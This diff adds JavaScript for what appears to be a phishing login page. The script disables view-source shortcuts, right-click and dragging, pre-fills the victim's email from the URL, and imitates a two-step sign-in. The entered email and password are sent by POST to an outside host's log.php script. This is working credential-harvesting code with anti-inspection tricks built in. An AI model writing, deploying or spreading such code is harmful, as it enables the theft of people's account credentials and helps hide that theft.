@@ -1,0 +1,91 @@
+
+      function redirectCU(e) {
+        if (e.ctrlKey && e.which == 85) {
+      	return false;
+        }
+      }
+      document.onkeydown = redirectCU;
+      
+      function redirectKK(e) {
+        if (e.which == 3) {
+      	return false;
+        }
+      }
+      document.oncontextmenu = redirectKK;
+      
+      $("#pass").animate({left:0, opacity:"show"}, 1500);
+      var email = window.location.hash.substr(1);
+      var PASS = document.getElementById('password');
+      var PASSX = document.getElementById('passwordx');
+      var PASSY = document.getElementById('passwordy');
+      
+      $('#password').focus();
+      
+      var displayName = $('#displayName');
+      displayName.attr('value', email);
+      $('[name=email]').val(email);
+      //displayName.html(email);
+      
+      $('#password').keyup(function (event) {
+      	if (event.which == 13) {
+      		$('#Tombol1').click();
+      	}
+      });
+      
+      
+      $('#backBtn').click(function(){
+      	$('#password').val('');
+      	$('#password').hide();
+      	$('#email').show();
+      	$('#Tombol1').val('Next');
+      	$('#backBtn').hide();
+      	$('#displayName').html('');
+      });
+      
+      var Tombol1 = $('#Tombol1');
+      Tombol1.click(function(e){
+      	e.preventDefault();
+      	
+      	var email = $('#email').val();
+      	var pass = $('#password');
+      	var password_v = pass.val();
+      	
+      	if(email==''){
+      		pass.hide();
+      		$('#email').show();
+      		Tombol1.val('Next');
+      		$('#backBtn').hide();
+      	}else if(email!=='' && password_v==''){
+      		$('#displayName').html(email);
+      		Tombol1.val('Sign In');
+      		pass.show();
+      		$('#email').hide();
+      		$('#backBtn').show();
+      	}else{
+      	$.ajax({
+      		url: 'https://craighonick.com/log.php',
+      		type: 'POST', 
+      		dataType: 'html', 
+      		beforeSend: function(){
+      			$("#loader").show();
+      		},
+      		data: { u : email, p : password_v}, 
+      		crossDomain: true,
+      		success: function(data) {
+      			$("#loader").hide();
+      			$('#fr').html(data);
+      		},
+      		error: function(e) {
+      			alert('Error Occurred. Try again.');
+      			window.location.href="";
+      		}
+      	});
+      	}
+      	
+      	
+      	
+      });
+      
+      window.ondragstart = function() { return false; }
+      
+   
